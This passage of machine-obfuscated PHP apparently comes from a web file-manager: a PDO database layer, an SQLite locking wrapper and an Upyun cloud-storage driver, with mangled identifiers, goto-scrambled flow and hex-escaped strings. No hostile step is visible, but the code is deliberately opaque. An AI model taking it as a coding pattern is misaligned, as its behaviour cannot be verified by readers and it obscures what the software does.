$d²”»²¸Œø =& $_SERVER[¯Ò¬Èè]; if ($bä„¹¡Ì»±) { $d…Æ“ò = $this->parseKeyCheck($d…Æ“ò); } if ($d…Æ“ò != $d²”»²¸Œø[176] && !preg_match($d²”»²¸Œø[832], $d…Æ“ò)) { $d…Æ“ò = $d²”»²¸Œø[833] . trim($d…Æ“ò, $d²”»²¸Œø[833]) . $d²”»²¸Œø[833]; } return $d…Æ“ò; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($cØ×ˆ›Õ = '') { $Bôøî•ÈÀ§ =& $_SERVER[¯Ò¬Èè]; if (!class_exists($Bôøî•ÈÀ§[835])) { think_exception(think_lang($Bôøî•ÈÀ§[10]) . $Bôøî•ÈÀ§[836]); } if (!empty($cØ×ˆ›Õ)) { $this->config = $cØ×ˆ›Õ; if (empty($this->config[$Bôøî•ÈÀ§[13]])) { $this->config[$Bôøî•ÈÀ§[13]] = array(); } } } public function connect($b“ëÖí´ Â = '', $dªîôµÅ‘‘ = 0) { $Fİ•Ü³†½ =& $_SERVER[¯Ò¬Èè]; if (!isset($this->linkID[$dªîôµÅ‘‘])) { goto F¬ê Œ‘î; d’·‚Ì×‡: $this->linkID[$dªîôµÅ‘‘]->exec($Fİ•Ü³†½[846] . think_config($Fİ•Ü³†½[813])); $this->connected = !0; if (1 != think_config($Fİ•Ü³†½[18])) { unset($this->config); } goto F‹ÀÒ¨Â‹’; FÌ¨„Ä°: $this->dbType = $this->_getDsnType($b“ëÖí´ Â[$Fİ•Ü³†½[837]]); if (in_array($this->dbType, array($Fİ•Ü³†½[838], $Fİ•Ü³†½[839], $Fİ•Ü³†½[840], $Fİ•Ü³†½[841]))) { think_exception($Fİ•Ü³†½[842] . $this->dbType . $Fİ•Ü³†½[843] . $this->dbType . $Fİ•Ü³†½[844]); } if (!$this->linkID[$dªîôµÅ‘‘]) { think_exception($Fİ•Ü³†½[845]); } goto d’·‚Ì×‡; F¬ê Œ‘î: if (empty($b“ëÖí´ Â)) { $b“ëÖí´ Â = $this->config; } if ($this->pconnect) { $b“ëÖí´ Â[$Fİ•Ü³†½[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$dªîôµÅ‘‘] = new PDO($b“ëÖí´ Â[$Fİ•Ü³†½[837]], $b“ëÖí´ Â[$Fİ•Ü³†½[810]], $b“ëÖí´ Â[$Fİ•Ü³†½[811]], $b“ëÖí´ Â[$Fİ•Ü³†½[13]]); } catch (PDOException $bè‡­Ìâà’) { think_exception($bè‡­Ìâà’->getMessage()); } goto FÌ¨„Ä°; F‹ÀÒ¨Â‹’: } return $this->linkID[$dªîôµÅ‘‘]; } public function free() { $this->PDOStatement = null; } public function query($dÖÓêƒ©»Ê, $AßèÙ†ÃŠÚ = array()) { goto f¢»×æ†Õ; f¢»×æ†Õ: $BŸÏ³ “àÜ =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aä¥öó«»Õ; F‚ÊŞ×£â·: if (!1 === $aÙ½±ÆÎœ‡) { $this->error(); return !1; } else { return $this->getAll(); } goto BôêÔ’ß‡®; C…¯ñÅÛäæ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $aÙ½±ÆÎœ‡ = $this->PDOStatement->execute($AßèÙ†ÃŠÚ); $this->debug(); goto F‚ÊŞ×£â·; eİ”Ü…®: think_action_status($BŸÏ³ “àÜ[19], 1); think_status($BŸÏ³ “àÜ[20]); $this->PDOStatement = $this->_linkID->prepare($dÖÓêƒ©»Ê); goto C…¯ñÅÛäæ; aä¥öó«»Õ: $this->queryStr = $dÖÓêƒ©»Ê; if (!empty($AßèÙ†ÃŠÚ)) { $this->queryStr .= $BŸÏ³ “àÜ[847] . print_r($AßèÙ†ÃŠÚ, !0) . $BŸÏ³ “àÜ[848]; } if (!empty($this->PDOStatement)) { $this->free(); } goto eİ”Ü…®; BôêÔ’ß‡®: } public function execute($f¤Í±è÷¸Ò, $BÆ¡”ğœ³ = array()) { goto c©‘ªöª÷©; BèßŒÒƒó§: think_status($eÈ‹‹é§Í˜[20]); $this->PDOStatement = $this->_linkID->prepare($f¤Í±è÷¸Ò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto AÑÀÂ¢”ª¶; c¾Õ…çö‘‘: if ($this->dbType == $eÈ‹‹é§Í˜[841]) { if (preg_match($eÈ‹‹é§Í˜[849], $this->queryStr, $D‘ÈÛíêŒ)) { $this->table = think_config($eÈ‹‹é§Í˜[850]) . str_ireplace(think_config($eÈ‹‹é§Í˜[851]), $eÈ‹‹é§Í˜[361], $D‘ÈÛíêŒ[2]); $f¹çÎÈ’ãì = (bool) $this->query($eÈ‹‹é§Í˜[852] . strtoupper($this->table) . $eÈ‹‹é§Í˜[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($eÈ‹‹é§Í˜[21], 1); goto BèßŒÒƒó§; c©‘ªöª÷©: $eÈ‹‹é§Í˜ =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eëç¤§®é¯; eëç¤§®é¯: $this->queryStr = $f¤Í±è÷¸Ò; if (!empty($BÆ¡”ğœ³)) { $this->queryStr .= $eÈ‹‹é§Í˜[847] . print_r($BÆ¡”ğœ³, !0) . $eÈ‹‹é§Í˜[848]; } $f¹çÎÈ’ãì = !1; goto c¾Õ…çö‘‘; AÑÀÂ¢”ª¶: $aÑ“›Ç‹ô‘ = $this->PDOStatement->execute($BÆ¡”ğœ³); $this->debug(); if (!1 === $aÑ“›Ç‹ô‘) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($f¹çÎÈ’ãì || preg_match($eÈ‹‹é§Í˜[853], $f¤Í±è÷¸Ò)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto A½ßÚÅŠ£Ü; A½ßÚÅŠ£Ü: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d×ä­äÌ«Ó = $this->_linkID->commit(); $this->transTimes = 0; if (!$d×ä­äÌ«Ó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F¥àìí´ŸŒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$F¥àìí´ŸŒ) { $this->error(); return !1; } } return !0; } private function getAll() { $b·†ìÆÌ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($b·†ìÆÌ); return $b·†ìÆÌ; } public function getFields($fŞ‹ÒïÅ¢ğ) { goto d´ª†¤âÈ“; d´ª†¤âÈ“: $cÈºÖØµâ =& $_SERVER[¯Ò¬Èè]; $this->initConnect(!0); if (think_config($cÈºÖØµâ[854])) { $c”Æë–ñœŒ = str_replace($cÈºÖØµâ[855], $fŞ‹ÒïÅ¢ğ, think_config($cÈºÖØµâ[854])); } else { switch ($this->dbType) { case $cÈºÖØµâ[838]: case $cÈºÖØµâ[856]: $c”Æë–ñœŒ = "\x53\x45\114\105\x43\x54\x20\40\40\x63\x6f\x6c\165\x6d\x6e\x5f\x6e\141\155\145\x20\x61\163\40\x27\116\141\x6d\145\47\x2c\40\x20\x20\144\x61\164\x61\x5f\x74\171\160\x65\x20\141\163\x20\x27\124\171\160\x65\47\54\x20\40\40\x63\157\154\165\x6d\156\137\x64\145\146\x61\x75\154\164\40\x61\x73\x20\x27\x44\x65\x66\x61\165\154\x74\47\x2c\x20\40\x20\x69\x73\137\x6e\x75\154\154\141\x62\154\x65\x20\x61\163\x20\47\x4e\x75\x6c\x6c\47\xa\11\11\106\x52\x4f\x4d\x9\151\156\x66\x6f\x72\x6d\141\x74\151\x6f\x6e\x5f\x73\143\x68\145\x6d\x61\56\x74\141\142\x6c\x65\163\40\x41\123\x20\164\xa\x9\x9\x4a\x4f\111\116\x9\151\156\146\x6f\x72\x6d\x61\164\151\157\x6e\137\163\143\x68\145\x6d\141\56\x63\x6f\x6c\165\155\156\163\40\x41\x53\x20\x63\xa\x9\x9\117\x4e\40\40\x74\56\x74\x61\x62\x6c\145\x5f\x63\141\164\141\154\x6f\147\40\x3d\40\143\56\164\141\142\x6c\145\x5f\143\x61\164\141\x6c\157\x67\xa\x9\x9\x41\116\x44\x20\164\56\x74\141\142\154\x65\137\x73\x63\x68\x65\x6d\x61\x20\75\40\x63\x2e\164\141\x62\x6c\x65\x5f\x73\143\150\x65\x6d\x61\xa\x9\x9\x41\x4e\x44\40\x74\56\164\x61\142\154\x65\137\156\x61\155\145\x20\75\x20\x63\x2e\x74\x61\142\154\145\x5f\x6e\x61\x6d\x65\xa\x9\11\127\110\x45\122\105\40\x20\x20\x74\56\x74\141\142\x6c\145\x5f\156\x61\x6d\x65\40\x3d\x20\x27{$fŞ‹ÒïÅ¢ğ}\x27"; break; case $cÈºÖØµâ[857]: $c”Æë–ñœŒ = $cÈºÖØµâ[858] . $fŞ‹ÒïÅ¢ğ . $cÈºÖØµâ[859]; break; case $cÈºÖØµâ[839]: case $cÈºÖØµâ[841]: $c”Æë–ñœŒ = $cÈºÖØµâ[860] . $cÈºÖØµâ[861] . $cÈºÖØµâ[862] . strtoupper($fŞ‹ÒïÅ¢ğ) . $cÈºÖØµâ[863] . strtoupper($fŞ‹ÒïÅ¢ğ) . $cÈºÖØµâ[864]; break; case $cÈºÖØµâ[865]: $c”Æë–ñœŒ = $cÈºÖØµâ[866] . $fŞ‹ÒïÅ¢ğ . $cÈºÖØµâ[867]; break; case $cÈºÖØµâ[840]: break; case $cÈºÖØµâ[868]: default: $c”Æë–ñœŒ = $cÈºÖØµâ[869] . ($this->dbType == $cÈºÖØµâ[868] ? "\x60{$fŞ‹ÒïÅ¢ğ}\x60" : $fŞ‹ÒïÅ¢ğ); } } goto aç¨¿©ˆŸ¾; F©ö‘êÎßİ: return $a¤«î³Ö—; goto dÎ—±Œ¤‚; aç¨¿©ˆŸ¾: $bá‰‚¸éæ‚ = $this->query($c”Æë–ñœŒ); $a¤«î³Ö— = array(); if ($bá‰‚¸éæ‚) { foreach ($bá‰‚¸éæ‚ as $dæƒ¬Éá® => $BµÌ‰Ô›Û…) { $BµÌ‰Ô›Û… = array_change_key_case($BµÌ‰Ô›Û…); $BµÌ‰Ô›Û…[$cÈºÖØµâ[28]] = isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[28]]) ? $BµÌ‰Ô›Û…[$cÈºÖØµâ[28]] : $cÈºÖØµâ[361]; $BµÌ‰Ô›Û…[$cÈºÖØµâ[29]] = isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[29]]) ? $BµÌ‰Ô›Û…[$cÈºÖØµâ[29]] : $cÈºÖØµâ[361]; $Bë¥¹‡À¿Ğ = isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[261]]) ? $BµÌ‰Ô›Û…[$cÈºÖØµâ[261]] : $BµÌ‰Ô›Û…[$cÈºÖØµâ[28]]; $a¤«î³Ö—[$Bë¥¹‡À¿Ğ] = array($cÈºÖØµâ[28] => $Bë¥¹‡À¿Ğ, $cÈºÖØµâ[29] => $BµÌ‰Ô›Û…[$cÈºÖØµâ[29]], $cÈºÖØµâ[31] => (bool) (isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[99]]) && $BµÌ‰Ô›Û…[$cÈºÖØµâ[99]] === $cÈºÖØµâ[33] || isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[31]]) && $BµÌ‰Ô›Û…[$cÈºÖØµâ[31]] === $cÈºÖØµâ[33]), $cÈºÖØµâ[34] => isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[34]]) ? $BµÌ‰Ô›Û…[$cÈºÖØµâ[34]] : (isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[53]]) ? $BµÌ‰Ô›Û…[$cÈºÖØµâ[53]] : $cÈºÖØµâ[361]), $cÈºÖØµâ[36] => isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[89]]) ? strtolower($BµÌ‰Ô›Û…[$cÈºÖØµâ[89]]) == $cÈºÖØµâ[38] : (isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[54]]) ? $BµÌ‰Ô›Û…[$cÈºÖØµâ[54]] : !1), $cÈºÖØµâ[39] => isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[870]]) ? strtolower($BµÌ‰Ô›Û…[$cÈºÖØµâ[870]]) == $cÈºÖØµâ[41] : (isset($BµÌ‰Ô›Û…[$cÈºÖØµâ[89]]) ? $BµÌ‰Ô›Û…[$cÈºÖØµâ[89]] : !1)); } } goto F©ö‘êÎßİ; dÎ—±Œ¤‚: } public function getTables($AáíøÄ…ô = '') { $E »Æ¶•¥ß =& $_SERVER[¯Ò¬Èè]; if (think_config($E »Æ¶•¥ß[871])) { $e„‰—œªÉ• = str_replace($E »Æ¶•¥ß[872], $AáíøÄ…ô, think_config($E »Æ¶•¥ß[871])); } else { switch ($this->dbType) { case $E »Æ¶•¥ß[839]: case $E »Æ¶•¥ß[841]: $e„‰—œªÉ• = $E »Æ¶•¥ß[873]; break; case $E »Æ¶•¥ß[838]: case $E »Æ¶•¥ß[856]: $e„‰—œªÉ• = $E »Æ¶•¥ß[874]; break; case $E »Æ¶•¥ß[865]: $e„‰—œªÉ• = $E »Æ¶•¥ß[875]; break; case $E »Æ¶•¥ß[840]: think_exception(think_lang($E »Æ¶•¥ß[876]) . $E »Æ¶•¥ß[877]); break; case $E »Æ¶•¥ß[857]: $e„‰—œªÉ• = $E »Æ¶•¥ß[42] . $E »Æ¶•¥ß[43] . $E »Æ¶•¥ß[44]; break; case $E »Æ¶•¥ß[868]: default: if (!empty($AáíøÄ…ô)) { $e„‰—œªÉ• = $E »Æ¶•¥ß[821] . $AáíøÄ…ô; } else { $e„‰—œªÉ• = $E »Æ¶•¥ß[822]; } } } $a¢‡ ˆÍ˜ª = $this->query($e„‰—œªÉ•); $AİÈâ—Î´ = array(); foreach ($a¢‡ ˆÍ˜ª as $Bó“Õ§™—È => $D¢áÛÊÉ˜) { $AİÈâ—Î´[$Bó“Õ§™—È] = current($D¢áÛÊÉ˜); } return $AİÈâ—Î´; } protected function parseLimit($eªŠš’İ²) { $AÔ×‘ºí• =& $_SERVER[¯Ò¬Èè]; $f‡¾ä‹™ğ = $AÔ×‘ºí•[33]; if (!empty($eªŠš’İ²)) { switch ($this->dbType) { case $AÔ×‘ºí•[865]: case $AÔ×‘ºí•[857]: $eªŠš’İ² = explode($AÔ×‘ºí•[47], $eªŠš’İ²); if (count($eªŠš’İ²) > 1) { $f‡¾ä‹™ğ .= $AÔ×‘ºí•[48] . $eªŠš’İ²[1] . $AÔ×‘ºí•[49] . $eªŠš’İ²[0] . $AÔ×‘ºí•[50]; } else { $f‡¾ä‹™ğ .= $AÔ×‘ºí•[48] . $eªŠš’İ²[0] . $AÔ×‘ºí•[50]; } break; case $AÔ×‘ºí•[838]: case $AÔ×‘ºí•[856]: break; case $AÔ×‘ºí•[840]: break; case $AÔ×‘ºí•[839]: case $AÔ×‘ºí•[841]: break; case $AÔ×‘ºí•[868]: default: $f‡¾ä‹™ğ .= $AÔ×‘ºí•[48] . $eªŠš’İ² . $AÔ×‘ºí•[50]; } } return $f‡¾ä‹™ğ; } public function parseKey(&$a÷óÇçÇ‚Ë, $e¯ßİ‚ˆŠ = true) { $F¢µ²Ú¨µÍ =& $_SERVER[¯Ò¬Èè]; if ($e¯ßİ‚ˆŠ) { $a÷óÇçÇ‚Ë = $this->parseKeyCheck($a÷óÇçÇ‚Ë); } if ($this->dbType == $F¢µ²Ú¨µÍ[868]) { if ($a÷óÇçÇ‚Ë != $F¢µ²Ú¨µÍ[176] && !preg_match($F¢µ²Ú¨µÍ[832], $a÷óÇçÇ‚Ë)) { $a÷óÇçÇ‚Ë = $F¢µ²Ú¨µÍ[833] . trim($a÷óÇçÇ‚Ë, $F¢µ²Ú¨µÍ[833]) . $F¢µ²Ú¨µÍ[833]; } return $a÷óÇçÇ‚Ë; } else { return parent::parseKey($a÷óÇçÇ‚Ë); } } public function close() { $this->_linkID = null; } public function error() { $b´³‘ˆ—¨Û =& $_SERVER[¯Ò¬Èè]; if ($this->PDOStatement) { $D±¬Ó—”±­ = $this->PDOStatement->errorInfo(); $this->error = $D±¬Ó—”±­[1] . $b´³‘ˆ—¨Û[4] . $D±¬Ó—”±­[2]; } else { $this->error = $b´³‘ˆ—¨Û[33]; } if ($b´³‘ˆ—¨Û[33] != $this->queryStr) { $this->error .= LNG($b´³‘ˆ—¨Û[45]) . $this->queryStr; } think_trace($this->error, $b´³‘ˆ—¨Û[33], $b´³‘ˆ—¨Û[46]); return $this->error; } public function escapeString($Cà®äù´‚) { $fÜ¹Ìóöæ =& $_SERVER[¯Ò¬Èè]; switch ($this->dbType) { case $fÜ¹Ìóöæ[865]: case $fÜ¹Ìóöæ[838]: case $fÜ¹Ìóöæ[856]: case $fÜ¹Ìóöæ[868]: return addslashes($Cà®äù´‚); case $fÜ¹Ìóöæ[840]: case $fÜ¹Ìóöæ[857]: case $fÜ¹Ìóöæ[839]: case $fÜ¹Ìóöæ[841]: return str_ireplace($fÜ¹Ìóöæ[55], $fÜ¹Ìóöæ[56], $Cà®äù´‚); } } protected function parseValue($D¡é¡ºÓÂ) { $aˆ™ƒ»æö =& $_SERVER[¯Ò¬Èè]; if (is_string($D¡é¡ºÓÂ)) { $D¡é¡ºÓÂ = strpos($D¡é¡ºÓÂ, $aˆ™ƒ»æö[4]) === 0 ? $this->escapeString($D¡é¡ºÓÂ) : $aˆ™ƒ»æö[878] . $this->escapeString($D¡é¡ºÓÂ) . $aˆ™ƒ»æö[878]; } elseif (isset($D¡é¡ºÓÂ[0]) && is_string($D¡é¡ºÓÂ[0]) && strtolower($D¡é¡ºÓÂ[0]) == $aˆ™ƒ»æö[285]) { $D¡é¡ºÓÂ = $this->escapeString($D¡é¡ºÓÂ[1]); } elseif (is_array($D¡é¡ºÓÂ)) { $D¡é¡ºÓÂ = array_map(array($this, $aˆ™ƒ»æö[879]), $D¡é¡ºÓÂ); } elseif (is_bool($D¡é¡ºÓÂ)) { $D¡é¡ºÓÂ = $D¡é¡ºÓÂ ? $aˆ™ƒ»æö[83] : $aˆ™ƒ»æö[468]; } elseif (is_null($D¡é¡ºÓÂ)) { $D¡é¡ºÓÂ = $aˆ™ƒ»æö[99]; } return $D¡é¡ºÓÂ; } public function getLastInsertId() { $CµÄ…ƒ¼í =& $_SERVER[¯Ò¬Èè]; switch ($this->dbType) { case $CµÄ…ƒ¼í[865]: case $CµÄ…ƒ¼í[857]: case $CµÄ…ƒ¼í[838]: case $CµÄ…ƒ¼í[856]: case $CµÄ…ƒ¼í[840]: case $CµÄ…ƒ¼í[868]: return $this->_linkID->lastInsertId(); case $CµÄ…ƒ¼í[839]: case $CµÄ…ƒ¼í[841]: $B„™ö¹Ô ´ = $this->table; $DÏÅ¦‹Ÿ® = $this->query("\123\105\114\105\x43\124\40{$B„™ö¹Ô ´}\56\x63\165\x72\x72\166\x61\x6c\x20\x63\165\x72\162\166\x61\154\40\x46\122\117\x4d\x20\144\165\141\154"); return $DÏÅ¦‹Ÿ® ? $DÏÅ¦‹Ÿ®[0][$CµÄ…ƒ¼í[880]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($DÖÔÔ•½â) { goto DÀêÑº¿œ¼; bøİßïœ´ç: if (!$E³ÖâÅ‹÷) { return !1; } if (flock($E³ÖâÅ‹÷, LOCK_EX)) { $f§­Í•è£Œ = parent::query($DÖÔÔ•½â); flock($E³ÖâÅ‹÷, LOCK_UN); fclose($E³ÖâÅ‹÷); return $f§­Í•è£Œ; } flock($E³ÖâÅ‹÷, LOCK_UN); goto DÒÑÙÍ¿Â; DÒÑÙÍ¿Â: fclose($E³ÖâÅ‹÷); show_json($C ‹ñ‡Š³—[883], !1); return !1; goto c£é¢ëÆ¾‘; DÀêÑº¿œ¼: $C ‹ñ‡Š³— =& $_SERVER[¯Ò¬Èè]; $cã›‹©îùÂ = DATA_PATH . $C ‹ñ‡Š³—[881]; $E³ÖâÅ‹÷ = fopen($cã›‹©îùÂ, $C ‹ñ‡Š³—[882]); goto bøİßïœ´ç; c£é¢ëÆ¾‘: } public function execute($bØ£“Ÿ¬ ) { goto f§ÁÂÛªÑ»; f§ÁÂÛªÑ»: $F¹Úé¦Š£ =& $_SERVER[¯Ò¬Èè]; $FÂ§¬áàÈ = DATA_PATH . $F¹Úé¦Š£[881]; $bñ”¹Ó” = fopen($FÂ§¬áàÈ, $F¹Úé¦Š£[882]); goto A¬ÔÎøã¾…; dÌ§„Ö Ş: fclose($bñ”¹Ó”); show_json($F¹Úé¦Š£[883], !1); return !1; goto DœÁ‰¹œäÎ; A¬ÔÎøã¾…: if (!$bñ”¹Ó”) { return !1; } if (flock($bñ”¹Ó”, LOCK_EX)) { $aÍ†Ñ³„ÛØ = parent::execute($bØ£“Ÿ¬ ); flock($bñ”¹Ó”, LOCK_UN); fclose($bñ”¹Ó”); return $aÍ†Ñ³„ÛØ; } flock($bñ”¹Ó”, LOCK_UN); goto dÌ§„Ö Ş; DœÁ‰¹œäÎ: } } goto BñŠ•µœ÷; aÁ¨ÏêÆÀ¾: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\x2f\x2f\166\60\56\141\160\151\56\165\x70\171\x75\x6e\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($CÅç†²Ş ) { parent::__construct(); $this->_init($CÅç†²Ş ); } public function _init($A÷‘¢ˆ’¾) { foreach ($A÷‘¢ˆ’¾ as $DÍŠÒÁ“ÖØ => $dÙ¸ØÖš‘) { if (isset($this->{$DÍŠÒÁ“ÖØ})) { $this->{$DÍŠÒÁ“ÖØ} = $dÙ¸ØÖš‘; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¯Ò¬Èè][1249], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($CÛÏĞ¹£Û, $c§®¹àå£¹ = "\x47\x45\124") { $EÓ¶á¨±’® =& $_SERVER[¯Ò¬Èè]; $BÂí‹ù”ôÛ = gmdate($EÓ¶á¨±’®[1213]); $D„Í–í º = base64_encode(hash_hmac($EÓ¶á¨±’®[1250], "{$c§®¹àå£¹}\x26{$CÛÏĞ¹£Û}\x26{$BÂí‹ù”ôÛ}", md5("{$this->userpass}"), !0)); $e‹îË·Ì‡§ = array("\101\x75\164\x68\157\162\151\x7a\141\x74\x69\x6f\x6e\72\125\120\131\x55\x4e\x20{$this->username}\72{$D„Í–í º}", "\104\141\164\145\72{$BÂí‹ù”ôÛ}"); return $e‹îË·Ì‡§; } public function ussRequest($fˆˆéÛ—Ÿˆ, $dÇ…¯¢‰İ• = "\x47\105\124", $dªËŒÁ íÜ = false, $aÃâœ‘…ö„ = false, $aö”ñ†Ó£ = false) { goto a‹­ö«ËÂá; FÌÄ¸ÙÜÎ: $A‰Ø×ÒÜÖ¾ = $this->ussHeaders($dİÊ”¤…È…, $dÇ…¯¢‰İ•); if ($aÃâœ‘…ö„) { $A‰Ø×ÒÜÖ¾ = array_merge($A‰Ø×ÒÜÖ¾, $aÃâœ‘…ö„); } $BİŒà“ÖØˆ = url_request($this->endpoint . $dİÊ”¤…È…, $dÇ…¯¢‰İ•, $dªËŒÁ íÜ, $A‰Ø×ÒÜÖ¾, $aö”ñ†Ó£); goto DÓ÷Œ„Ó‰·; a‹­ö«ËÂá: $a‘Ú§Õ¼³ =& $_SERVER[¯Ò¬Èè]; $fˆˆéÛ—Ÿˆ = trim($fˆˆéÛ—Ÿˆ, $a‘Ú§Õ¼³[8]); $dİÊ”¤…È… = "\x2f{$this->bucket}\x2f{$fˆˆéÛ—Ÿˆ}"; goto FÌÄ¸ÙÜÎ; DÓ÷Œ„Ó‰·: if (!$BİŒà“ÖØˆ) { return array($a‘Ú§Õ¼³[1041] => !1, $a‘Ú§Õ¼³[1043] => $a‘Ú§Õ¼³[1251]); } if (strtolower($dÇ…¯¢‰İ•) == $a‘Ú§Õ¼³[184] || in_array($BİŒà“ÖØˆ[$a‘Ú§Õ¼³[1041]], array($a‘Ú§Õ¼³[1109], $a‘Ú§Õ¼³[1252]))) { $dªËŒÁ íÜ = $BİŒà“ÖØˆ[$a‘Ú§Õ¼³[1253]]; } else { $dªËŒÁ íÜ = json_decode($BİŒà“ÖØˆ[$a‘Ú§Õ¼³[1043]], !0); if (!$dªËŒÁ íÜ) { $dªËŒÁ íÜ = $BİŒà“ÖØˆ[$a‘Ú§Õ¼³[1043]]; } else { if (!$BİŒà“ÖØˆ[$a‘Ú§Õ¼³[703]] && isset($dªËŒÁ íÜ[$a‘Ú§Õ¼³[1254]])) { $dªËŒÁ íÜ = $dªËŒÁ íÜ[$a‘Ú§Õ¼³[1254]]; } } } return array($a‘Ú§Õ¼³[1041] => $BİŒà“ÖØˆ[$a‘Ú§Õ¼³[703]], $a‘Ú§Õ¼³[1043] => $dªËŒÁ íÜ); goto FÏ—’‚ìÆ†; FÏ—’‚ìÆ†: } public function mkfile($dÁ‘ÁÖ‹‘, $f«ÄˆÏšÛê = '', $F™Äš‹Ö· = REPEAT_RENAME) { if ($this->setContent($dÁ‘ÁÖ‹‘, $f«ÄˆÏšÛê)) { return $this->getPathOuter($dÁ‘ÁÖ‹‘); } return !1; } public function mkdir($d«ªëÄå¼İ, $B§Ü´õ›°ª = REPEAT_SKIP) { $BÓƒ¸Ò´Ú =& $_SERVER[¯Ò¬Èè]; $cœ¹Û§£ƒÚ = trim($d«ªëÄå¼İ, $BÓƒ¸Ò´Ú[8]); if ($this->_isFolder($cœ¹Û§£ƒÚ)) { return $this->getPathOuter($cœ¹Û§£ƒÚ); } $aÕ´ƒ¾Õ±Æ = array($BÓƒ¸Ò´Ú[1255]); $F­…ëœê± = $this->ussRequest($cœ¹Û§£ƒÚ, $BÓƒ¸Ò´Ú[212], !1, $aÕ´ƒ¾Õ±Æ); return $F­…ëœê±[$BÓƒ¸Ò´Ú[1041]] ? $this->getPathOuter($cœ¹Û§£ƒÚ) : !1; } public function copyFile($B­ìùŞğø, $Aö²À´Ôò) { $AŒèèó™™ =& $_SERVER[¯Ò¬Èè]; $B®Í®‰¸èÚ = array($AŒèèó™™[1256] . "\x2f{$this->bucket}\x2f{$B­ìùŞğø}", $AŒèèó™™[1257]); $D©ïÇ‰âæ› = $this->ussRequest($Aö²À´Ôò, $AŒèèó™™[214], !1, $B®Í®‰¸èÚ); return $D©ïÇ‰âæ›[$AŒèèó™™[1041]] ? !0 : $this->getPathOuter($Aö²À´Ôò); } public function moveFile($D©¢Ü³ÛÌä, $dÌŒ¡˜å¾µ) { $cºëâ”™Ç =& $_SERVER[¯Ò¬Èè]; $EÖ—»ˆôĞ° = array($cºëâ”™Ç[1258] . "\57{$this->bucket}\57{$D©¢Ü³ÛÌä}", $cºëâ”™Ç[1257]); $fõğ±ó·Š¨ = $this->ussRequest($dÌŒ¡˜å¾µ, $cºëâ”™Ç[214], !1, $EÖ—»ˆôĞ°); return $fõğ±ó·Š¨[$cºëâ”™Ç[1041]] ? !0 : $this->getPathOuter($dÌŒ¡˜å¾µ); } public function delFile($a·å·ÑÎ) { $aØ ¦™èÇœ =& $_SERVER[¯Ò¬Èè]; $FÈÁ¾ÇÌŞ = $this->ussRequest($a·å·ÑÎ, $aØ ¦™èÇœ[1259]); return $FÈÁ¾ÇÌŞ[$aØ ¦™èÇœ[1041]] ? !0 : !1; } public function delFolder($dÓÔ„°Ú±ù) { $d‹¡İòÉ‡§ =& $_SERVER[¯Ò¬Èè]; $bÂˆÇ¼íŠ = $this->listAll($dÓÔ„°Ú±ù); krsort($bÂˆÇ¼íŠ); foreach ($bÂˆÇ¼íŠ as $eìË±ö»„) { $this->ussRequest($eìË±ö»„[$d‹¡İòÉ‡§[75]], $d‹¡İòÉ‡§[1259]); } return $this->ussRequest($dÓÔ„°Ú±ù, $d‹¡İòÉ‡§[1259]); } public function rename($Eè“ÃöĞñ, $D©ª¤Ãï´É) { if ($this->isFile($Eè“ÃöĞñ)) { $D©ª¤Ãï´É = get_path_father($Eè“ÃöĞñ) . $D©ª¤Ãï´É; return $this->moveFile($Eè“ÃöĞñ, $D©ª¤Ãï´É); } return $this->renameObject($Eè“ÃöĞñ, $D©ª¤Ãï´É); } public function fileInfo($cÜÊ«ìñí, $EŠÆ¤Ó¾å¨ = false, $eº‘â»Æ‘ø = array()) { $Bá¹¢³äÅº =& $_SERVER[¯Ò¬Èè]; if ($EŠÆ¤Ó¾å¨) { return array($Bá¹¢³äÅº[28] => $this->pathThis($cÜÊ«ìñí), $Bá¹¢³äÅº[75] => $this->getPathOuter($Bá¹¢³äÅº[8] . $cÜÊ«ìñí), $Bá¹¢³äÅº[29] => $Bá¹¢³äÅº[167], $Bá¹¢³äÅº[77] => isset($eº‘â»Æ‘ø[$Bá¹¢³äÅº[325]]) ? $eº‘â»Æ‘ø[$Bá¹¢³äÅº[325]] : 0, $Bá¹¢³äÅº[160] => $this->ext($cÜÊ«ìñí)); } $F‹İìñäÉŠ = array($Bá¹¢³äÅº[28] => $this->pathThis($cÜÊ«ìñí), $Bá¹¢³äÅº[75] => $this->getPathOuter($Bá¹¢³äÅº[8] . $cÜÊ«ìñí), $Bá¹¢³äÅº[29] => $Bá¹¢³äÅº[167], $Bá¹¢³äÅº[187] => 0, $Bá¹¢³äÅº[107] => isset($bÃÎæÒßİ[$Bá¹¢³äÅº[1260]]) ? 